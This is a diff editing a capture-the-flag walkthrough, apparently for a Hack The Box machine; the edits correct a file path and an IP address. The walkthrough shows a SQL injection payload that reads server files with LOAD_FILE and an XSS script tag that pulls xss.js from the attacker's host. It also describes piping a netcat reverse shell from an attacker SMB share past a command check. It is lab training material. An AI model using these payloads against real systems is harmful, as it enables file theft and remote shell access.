@@ -48,7 +48,7 @@ The `search users` tab allows us to query a database for users. After some fuzzi
 
 ![backdoorchecker3](https://user-images.githubusercontent.com/48168337/188883408-28245182-3def-485c-8e90-a71dc46e7bae.png)
 
-Apparently, the backdoorchecker.php script allows you to identify backdoors located on the server, but the script can only be used locally. Once again, we were able to load this file using the SQL injection vulnerability in the `search users` input field. If you enter `' UNION SELECT 1,LOAD_FILE('c:/xampp/htdocs/backdoorchecker.php'),3-- -` into the `search users` input field, it will try to load the `backdoorchecker.php` script. It may fail to load using your web browser, so try to do this in repeater using BurpSuite. I have a video walkthrough at the end where you can see me doing this.
+Apparently, the backdoorchecker.php script allows you to identify backdoors located on the server, but the script can only be used locally. Once again, we were able to load this file using the SQL injection vulnerability in the `search users` input field. If you enter `' UNION SELECT 1,LOAD_FILE('c:/xampp/htdocs/admin/backdoorchecker.php'),3-- -` into the `search users` input field, it will try to load the `backdoorchecker.php` script. It may fail to load using your web browser, so try to do this in repeater using BurpSuite. I have a video walkthrough at the end where you can see me doing this.
 
 ![burp_backdoor](https://user-images.githubusercontent.com/48168337/188884523-f17629df-02a8-4105-92e0-b78d915d7e17.png)
 
@@ -59,7 +59,7 @@ But the script isn't checking if we're adding a `|` to our command. Remember, we
 ![xss_nc.js](https://user-images.githubusercontent.com/48168337/189116761-4adc79aa-bfa9-4909-a2f0-62ba9a736408.png)
 
 
-The script is pretty simple and straightforward. We're setting variables for our request, uri, and cookies (comes from the Burpsuite request). Then we're setting the request to be sent which is piping a netcat connection using `nc.exe` from our smbserver at `10.10.14.8\kali`. We'll call the script using the xss vulnerability, all we have to do is paste xss attack in the same input field as before. Here is what we will be pasting. `<script src="http://10.10.14./xss.js></script>`. I named my script xss.js.
+The script is pretty simple and straightforward. We're setting variables for our request, uri, and cookies (comes from the Burpsuite request). Then we're setting the request to be sent which is piping a netcat connection using `nc.exe` from our smbserver at `10.10.14.8\kali`. We'll call the script using the xss vulnerability, all we have to do is paste xss attack in the same input field as before. Here is what we will be pasting. `<script src="http://10.10.14.8/xss.js></script>`. I named my script xss.js.
 
 Now let’s set up the attack. We'll need an SMBserver to host what the script is using (`nc.exe`). And a webserver to host our script (`xss.js`). 
 
